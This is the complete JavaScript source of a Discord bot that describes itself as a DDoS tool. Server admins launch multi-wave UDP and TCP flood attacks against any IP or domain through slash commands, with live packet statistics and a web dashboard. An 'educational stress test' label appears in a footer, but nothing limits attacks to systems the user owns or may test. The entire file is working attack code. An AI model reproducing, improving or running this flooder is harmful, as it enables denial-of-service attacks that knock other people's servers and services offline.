// ===================================================================
// FINAL DDoS BOT – TCP PING + MULTI-WAVE + REALTIME STATS
// ===================================================================
require('dotenv').config();
const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, PermissionsBitField } = require('discord.js');
const { spawn } = require('child_process');
const net = require('net');
const dgram = require('dgram');
const dns = require('dns');
const express = require('express');
const http = require('http');

// ---------- GLOBALS ----------
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

let activeAttacks = new Map();
let attackCounter = 0;
const LOG_CHANNEL = process.env.LOG_CHANNEL_ID;
const OWNER = process.env.OWNER_ID;
const spinner = ['|', '/', '-', '\\'];

// ---------- UTILITY FUNCTIONS ----------
function generatePayload(size) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
  let payload = '';
  for (let i = 0; i < size; i++) {
    payload += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return payload;
}

function isValidIP(ip) {
  const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
  return ipv4Regex.test(ip);
}

// ---------- DNS RESOLVE WITH TIMEOUT ----------
function resolveDomainWithTimeout(host, timeoutMs = 2000) {
  return new Promise((resolve) => {
    let resolved = false;
    const timer = setTimeout(() => {
      if (!resolved) resolve(null);
    }, timeoutMs);

    dns.lookup(host, (err, address) => {
      if (!resolved) {
        resolved = true;
        clearTimeout(timer);
        if (err) resolve(null);
        else resolve(address);
      }
    });
  });
}

// ---------- TCP PING (HALF-OPEN SYN SCAN) ----------
function tcpPing(ip, port, timeoutMs = 1000) {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    let resolved = false;
    const timer = setTimeout(() => {
      if (!resolved) {
        resolved = true;
        socket.destroy();
        resolve(false);
      }
    }, timeoutMs);

    socket.connect(port, ip, () => {
      if (!resolved) {
        resolved = true;
        clearTimeout(timer);
        socket.destroy();
        resolve(true);
      }
    });

    socket.on('error', () => {
      if (!resolved) {
        resolved = true;
        clearTimeout(timer);
        socket.destroy();
        resolve(false);
      }
    });
  });
}

// ---------- MULTI-WAVE FLOOD ENGINE ----------
function launchFlooder(targetIP, targetPort, durationSeconds, packetSize, threads = 30) {
  return new Promise((resolve, reject) => {
    // Calculate wave timings: burst (first 10%), sustain (middle 80%), spike (last 10%)
    const burstDuration = Math.floor(durationSeconds * 0.1);
    const sustainDuration = Math.floor(durationSeconds * 0.8);
    const spikeDuration = durationSeconds - burstDuration - sustainDuration;
    
    const flooder = spawn('node', [
      '-e',
      `
        const net = require('net');
        const dgram = require('dgram');
        const target = '${targetIP}';
        const port = ${targetPort};
        const totalDuration = ${durationSeconds} * 1000;
        const size = ${packetSize};
        const threads = ${threads};
        const burstMs = ${burstDuration} * 1000;
        const sustainMs = ${sustainDuration} * 1000;
        const spikeMs = ${spikeDuration} * 1000;

        function generatePayload(s) {
          let p = '';
          for (let i=0; i<s; i++) p += String.fromCharCode(33 + Math.floor(Math.random()*94));
          return p;
        }

        let totalPackets = 0;
        let totalBytes = 0;
        let activeConnections = 0;
        let isRunning = true;

        // UDP flood function
        function udpFlood(duration, intensity) {
          const sock = dgram.createSocket('udp4');
          const payload = generatePayload(size);
          const start = Date.now();
          let sent = 0;
          while (isRunning && (Date.now() - start < duration)) {
            sock.send(payload, 0, payload.length, port, target, (err) => {});
            sent++;
            totalPackets++;
            totalBytes += payload.length;
            if (sent % (100 * intensity) === 0) setImmediate(() => {});
          }
          sock.close();
        }

        // TCP flood function
        function tcpFlood(duration, intensity) {
          const payload = generatePayload(size);
          const start = Date.now();
          let connections = 0;
          while (isRunning && (Date.now() - start < duration)) {
            const client = new net.Socket();
            client.connect(port, target, () => {
              client.write(payload);
              activeConnections++;
            });
            client.on('error', () => {});
            setTimeout(() => { 
              client.destroy();
              activeConnections--;
            }, 50);
            connections++;
            if (connections % (50 * intensity) === 0) setImmediate(() => {});
          }
        }

        // Launch waves
        function launchWave(duration, intensity) {
          const udpThreads = Math.ceil(threads * 0.6);
          const tcpThreads = Math.floor(threads * 0.4);
          for (let i = 0; i < udpThreads; i++) {
            setTimeout(() => udpFlood(duration, intensity), i * 5);
          }
          for (let i = 0; i < tcpThreads; i++) {
            setTimeout(() => tcpFlood(duration, intensity), i * 5);
          }
        }

        // Wave 1: Burst (high intensity)
        launchWave(burstMs, 3);
        
        // Wave 2: Sustain (medium intensity)
        setTimeout(() => {
          launchWave(sustainMs, 1.5);
        }, burstMs);
        
        // Wave 3: Spike (very high intensity)
        setTimeout(() => {
          launchWave(spikeMs, 5);
        }, burstMs + sustainMs);

        // Log stats every 5 seconds to stdout
        const statsInterval = setInterval(() => {
          console.log(\`STATS: packets=\${totalPackets}, bytes=\${totalBytes}, conns=\${activeConnections}\`);
        }, 5000);

        // Stop everything after total duration
        setTimeout(() => {
          isRunning = false;
          clearInterval(statsInterval);
          process.exit(0);
        }, totalDuration + 2000);
      `
    ], { stdio: ['ignore', 'pipe', 'pipe'] });

    let statsOutput = '';
    flooder.stdout.on('data', (data) => {
      const str = data.toString();
      statsOutput += str;
      // Parse stats for real-time updates
      const match = str.match(/STATS: packets=(\d+), bytes=(\d+), conns=(\d+)/);
      if (match) {
        const [_, packets, bytes, conns] = match;
        // Store latest stats in a global variable for the status command
        if (global._attackStats) {
          global._attackStats.packets = parseInt(packets);
          global._attackStats.bytes = parseInt(bytes);
          global._attackStats.conns = parseInt(conns);
        }
      }
    });

    flooder.stderr.on('data', (data) => {
      // Ignore errors – we want the flood to continue
    });

    flooder.on('close', (code) => {
      resolve({ code, output: statsOutput });
    });

    flooder.on('error', (err) => {
      reject(err);
    });

    return flooder;
  });
}

// ---------- DISCORD BOT LOGIC ----------
client.once('ready', async () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  await registerCommands();
  console.log('✅ Slash commands registered');
});

async function registerCommands() {
  const commands = [
    new SlashCommandBuilder()
      .setName('attack')
      .setDescription('Launch multi-wave DDoS on IP or domain')
      .addStringOption(option =>
        option.setName('target')
          .setDescription('Target (IP:Port or Domain:Port)')
          .setRequired(true)
      )
      .addIntegerOption(option =>
        option.setName('duration')
          .setDescription('Seconds (default: 60)')
          .setRequired(false)
      )
      .addIntegerOption(option =>
        option.setName('packetsize')
          .setDescription('Bytes (default: 1024)')
          .setRequired(false)
      )
      .addIntegerOption(option =>
        option.setName('threads')
          .setDescription('Threads (default: 30, max: 100)')
          .setRequired(false)
      ),
    new SlashCommandBuilder()
      .setName('stop')
      .setDescription('Stop your active attack'),
    new SlashCommandBuilder()
      .setName('status')
      .setDescription('Show active attacks with real-time stats'),
    new SlashCommandBuilder()
      .setName('killall')
      .setDescription('[OWNER] Terminate all attacks')
  ];

  try {
    const guild = client.guilds.cache.get(process.env.GUILD_ID);
    if (guild) {
      await guild.commands.set(commands);
    } else {
      await client.application.commands.set(commands);
    }
  } catch (err) {
    console.error('Command registration failed:', err);
  }
}

// ---------- COMMAND HANDLERS ----------
client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  const { commandName, user, guild } = interaction;

  if (commandName === 'attack') {
    await interaction.deferReply({ ephemeral: true });

    const member = guild.members.cache.get(user.id);
    if (!member.permissions.has(PermissionsBitField.Flags.Administrator) && user.id !== OWNER) {
      return interaction.editReply({ content: '⛔ Insufficient permissions.', ephemeral: true });
    }

    const rawTarget = interaction.options.getString('target');
    const duration = interaction.options.getInteger('duration') || 60;
    const packetSize = interaction.options.getInteger('packetsize') || 1024;
    const threads = Math.min(interaction.options.getInteger('threads') || 30, 100);

    let host, port = 30120;
    if (rawTarget.includes(':')) {
      const parts = rawTarget.split(':');
      host = parts[0];
      port = parseInt(parts[1]) || 30120;
    } else {
      host = rawTarget;
    }

    if (port < 1 || port > 65535) {
      return interaction.editReply({ content: '❌ Invalid port range.', ephemeral: true });
    }

    // --- Resolve domain with timeout ---
    let resolvedIP = host;
    if (!isValidIP(host)) {
      let loadingMsg = await interaction.editReply({ content: `🌐 Resolving \`${host}\`... ${spinner[0]}`, ephemeral: true });
      let spinIdx = 0;
      const interval = setInterval(async () => {
        spinIdx = (spinIdx + 1) % spinner.length;
        await interaction.editReply({ content: `🌐 Resolving \`${host}\`... ${spinner[spinIdx]}`, ephemeral: true });
      }, 2000);

      resolvedIP = await resolveDomainWithTimeout(host, 3000);
      clearInterval(interval);

      if (!resolvedIP) {
        return interaction.editReply({ content: `❌ Could not resolve \`${host}\` within 3 seconds.`, ephemeral: true });
      }
      await interaction.editReply({ content: `✅ Resolved \`${host}\` → \`${resolvedIP}\``, ephemeral: true });
    }

    // --- TCP Ping (1 second timeout) ---
    await interaction.editReply({ content: `📡 Pinging \`${resolvedIP}:${port}\`...`, ephemeral: true });
    const isAlive = await tcpPing(resolvedIP, port, 1000);
    
    let detailsBlock = '';
    if (isAlive) {
      detailsBlock = `\`\`\`\n✅ Server is reachable (TCP handshake successful)\nLaunching multi-wave attack...\n\`\`\``;
    } else {
      detailsBlock = `\`\`\`\n⚠️ Server unreachable (no TCP response)\nAttack will still proceed – UDP may work even if TCP is filtered.\n\`\`\``;
    }

    // Check for existing attack
    const attackKey = `${guild.id}-${user.id}`;
    if (activeAttacks.has(attackKey)) {
      return interaction.editReply({ content: '⚠️ You already have an active attack. Use `/stop`.', ephemeral: true });
    }

    // Initialize global stats
    global._attackStats = { packets: 0, bytes: 0, conns: 0 };

    // --- Launch flooder with retry logic ---
    let attempts = 0;
    let flooderProcess = null;
    let attackLaunched = false;

    while (attempts < 3 && !attackLaunched) {
      try {
        flooderProcess = await launchFlooder(resolvedIP, port, duration, packetSize, threads);
        attackLaunched = true;
      } catch (err) {
        attempts++;
        if (attempts >= 3) {
          return interaction.editReply({ content: `❌ Failed to launch attack after 3 attempts: ${err.message}`, ephemeral: true });
        }
        await interaction.editReply({ content: `⚠️ Attempt ${attempts} failed, retrying...`, ephemeral: true });
      }
    }

    if (!attackLaunched || !flooderProcess) {
      return interaction.editReply({ content: '❌ Critical error: could not launch attack.', ephemeral: true });
    }

    // Store attack
    activeAttacks.set(attackKey, {
      process: flooderProcess,
      target: rawTarget,
      resolvedIP: resolvedIP,
      port: port,
      duration: duration,
      startTime: Date.now(),
      threads: threads,
      packetSize: packetSize,
      isAlive: isAlive
    });

    attackCounter++;

    // --- Send initial attack embed ---
    const embed = new EmbedBuilder()
      .setTitle('🔥 MULTI-WAVE ATTACK LAUNCHED')
      .setColor(0xFF0000)
      .addFields(
        { name: 'Target', value: `${rawTarget} → ${resolvedIP}`, inline: false },
        { name: 'Port', value: `${port}`, inline: true },
        { name: 'Duration', value: `${duration}s (3 waves)`, inline: true },
        { name: 'Threads', value: `${threads}`, inline: true },
        { name: 'Packet Size', value: `${packetSize} bytes`, inline: true },
        { name: 'Reachable', value: isAlive ? '✅ Yes' : '⚠️ No (UDP may still work)', inline: true },
        { name: 'Initiated By', value: `<@${user.id}>`, inline: true },
        { name: 'Attack ID', value: `#${attackCounter}`, inline: true }
      )
      .setDescription(detailsBlock)
      .setTimestamp()
      .setFooter({ text: 'Educational stress test – traffic generation only' });

    const logChannel = client.channels.cache.get(LOG_CHANNEL);
    if (logChannel) await logChannel.send({ embeds: [embed] });

    // --- Real-time updates ---
    let updateMsg = await interaction.editReply({
      content: `✅ **ATTACK LIVE** - ${rawTarget} (${resolvedIP}:${port})\n⏱️ Elapsed: 0s / ${duration}s\n📦 Packets: 0\n📊 Connections: 0\n💾 Data: 0 MB`,
      ephemeral: true
    });

    const startTime = Date.now();
    const updateInterval = setInterval(async () => {
      const elapsed = Math.floor((Date.now() - startTime) / 1000);
      const remaining = Math.max(duration - elapsed, 0);
      const stats = global._attackStats || { packets: 0, bytes: 0, conns: 0 };
      const mb = (stats.bytes / (1024 * 1024)).toFixed(2);
      
      await interaction.editReply({
        content: `✅ **ATTACK LIVE** - ${rawTarget} (${resolvedIP}:${port})\n⏱️ Elapsed: ${elapsed}s / ${duration}s | Remaining: ${remaining}s\n📦 Packets: ${stats.packets.toLocaleString()}\n📊 Connections: ${stats.conns}\n💾 Data: ${mb} MB\n🧵 Threads: ${threads}`,
        ephemeral: true
      });
    }, 5000);

    // Auto-expire after duration
    setTimeout(() => {
      clearInterval(updateInterval);
      if (activeAttacks.has(attackKey)) {
        activeAttacks.delete(attackKey);
        const doneEmbed = new EmbedBuilder()
          .setTitle('⏹️ ATTACK COMPLETED')
          .setColor(0x00FF00)
          .addFields(
            { name: 'Target', value: `${rawTarget}`, inline: true },
            { name: 'Duration', value: `${duration}s`, inline: true },
            { name: 'Attack ID', value: `#${attackCounter}`, inline: true },
            { name: 'Total Packets', value: `${(global._attackStats?.packets || 0).toLocaleString()}`, inline: true },
            { name: 'Total Data', value: `${((global._attackStats?.bytes || 0) / (1024 * 1024)).toFixed(2)} MB`, inline: true }
          )
          .setTimestamp();
        if (logChannel) logChannel.send({ embeds: [doneEmbed] });
        interaction.editReply({
          content: `⏹️ Attack on ${rawTarget} completed. Total packets: ${(global._attackStats?.packets || 0).toLocaleString()}`,
          ephemeral: true
        }).catch(() => {});
      }
    }, duration * 1000 + 3000);

  } // end /attack

  else if (commandName === 'stop') {
    await interaction.deferReply({ ephemeral: true });
    const attackKey = `${guild.id}-${user.id}`;
    if (!activeAttacks.has(attackKey)) {
      return interaction.editReply({ content: 'ℹ️ No active attack.', ephemeral: true });
    }
    const attack = activeAttacks.get(attackKey);
    try {
      attack.process.kill('SIGTERM');
      activeAttacks.delete(attackKey);
      await interaction.editReply({ content: `🛑 Stopped attack on \`${attack.target}\`.`, ephemeral: true });
    } catch (err) {
      await interaction.editReply({ content: `❌ Error: ${err.message}`, ephemeral: true });
    }
  }

  else if (commandName === 'status') {
    await interaction.deferReply({ ephemeral: true });
    if (activeAttacks.size === 0) {
      return interaction.editReply({ content: '📊 No active attacks.', ephemeral: true });
    }
    let table = '📊 **ACTIVE ATTACKS**\n```\n';
    table += 'ID  | Target                  | Port | Elapsed | Remaining | Threads | Packets\n';
    table += '----|-------------------------|------|---------|-----------|---------|--------\n';
    let idx = 1;
    for (const [key, attack] of activeAttacks) {
      const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
      const remaining = Math.max(attack.duration - elapsed, 0);
      const targetStr = attack.target.length > 20 ? attack.target.substring(0, 17) + '...' : attack.target.padEnd(20);
      const packets = global._attackStats?.packets || 0;
      table += `${String(idx).padStart(2)}  | ${targetStr} | ${String(attack.port).padStart(4)} | ${String(elapsed).padStart(7)}s | ${String(remaining).padStart(9)}s | ${String(attack.threads).padStart(7)} | ${String(packets).padStart(7)}\n`;
      idx++;
    }
    table += '```';
    await interaction.editReply({ content: table, ephemeral: true });
  }

  else if (commandName === 'killall') {
    await interaction.deferReply({ ephemeral: true });
    if (user.id !== OWNER) {
      return interaction.editReply({ content: '⛔ Owner only.', ephemeral: true });
    }
    const count = activeAttacks.size;
    for (const [key, attack] of activeAttacks) {
      try { attack.process.kill('SIGKILL'); } catch (e) {}
    }
    activeAttacks.clear();
    await interaction.editReply({ content: `☠️ Killed ${count} attacks.`, ephemeral: true });
  }
});

// ---------- EXPRESS DASHBOARD ----------
const app = express();
app.get('/', (req, res) => {
  res.send(`
    <html>
      <head><title>Ultimate DDoS Bot</title></head>
      <body style="background:#0a0a0a;color:#00ff00;font-family:monospace;">
        <h1>⚡ ULTIMATE ATTACK ENGINE</h1>
        <p>Active Attacks: ${activeAttacks.size}</p>
        <p>Total Launched: ${attackCounter}</p>
        <p>Uptime: ${process.uptime().toFixed(2)}s</p>
        <p>Global Packets: ${(global._attackStats?.packets || 0).toLocaleString()}</p>
        <pre>${JSON.stringify(Array.from(activeAttacks.entries()).map(([k,v]) => ({ user: k, target: v.target, port: v.port, elapsed: Math.floor((Date.now()-v.startTime)/1000) })), null, 2)}</pre>
      </body>
    </html>
  `);
});
const server = http.createServer(app);
server.listen(process.env.PORT || 3000, () => {
  console.log(`🌐 Dashboard on port ${process.env.PORT || 3000}`);
});

// ---------- ERROR HANDLING ----------
process.on('unhandledRejection', (err) => console.error('Unhandled Rejection:', err));
process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err));

// ---------- LOGIN ----------
client.login(process.env.DISCORD_TOKEN).catch(err => {
  console.error('Login failed:', err);
  process.exit(1);
});
